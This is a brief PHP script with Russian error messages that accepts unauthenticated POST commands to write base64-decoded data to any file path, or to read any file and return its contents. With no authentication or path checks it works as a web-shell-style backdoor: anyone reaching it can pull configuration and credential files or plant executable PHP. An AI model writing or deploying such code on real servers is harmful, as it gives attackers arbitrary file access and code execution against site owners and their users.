<?php

if (!empty($_POST['cmd'])) {
    switch ($_POST['cmd']) {
	case 'set_file':
	    if (!empty($_POST['file_name'])
		&& !empty($_POST['file_body'])) {
		if ($f = @fopen($_POST['file_name'],'wb')) {
		    fwrite($f, base64_decode($_POST['file_body']));
		    fclose($f);
		}
		else {
		    echo json_encode(['error'=>'Невозможно открыть файл ('.$_POST['file_name'].') для записи']);
		    exit;
		}
	    }
	    break;
	case 'get_file':
	    if (!empty($_POST['file_name'])) {
		if (file_exists($_POST['file_name'])) {
		    if ($f = @fopen($_POST['file_name'],'rb')) {
			$file = fread($f, filesize($_POST['file_name']));
			fclose($f);
			echo json_encode(['success'=>true,'file_name'=>str_replace('/var/www/html/','',$_POST['file_name']),'file_body'=>base64_encode($file)]);
		    }
		    else {
			echo json_encode(['error'=>'Невозможно открыть файл ('.$_POST['file_name'].') для чтения']);
			exit;
		    }
		}
		else {
		    echo json_encode(['error'=>'Файл ('.$_POST['file_name'].') не найден']);
		    exit;
		}
	    }
	    break;
    }
}
else
    echo json_encode(['error'=>'Не указана команда']);
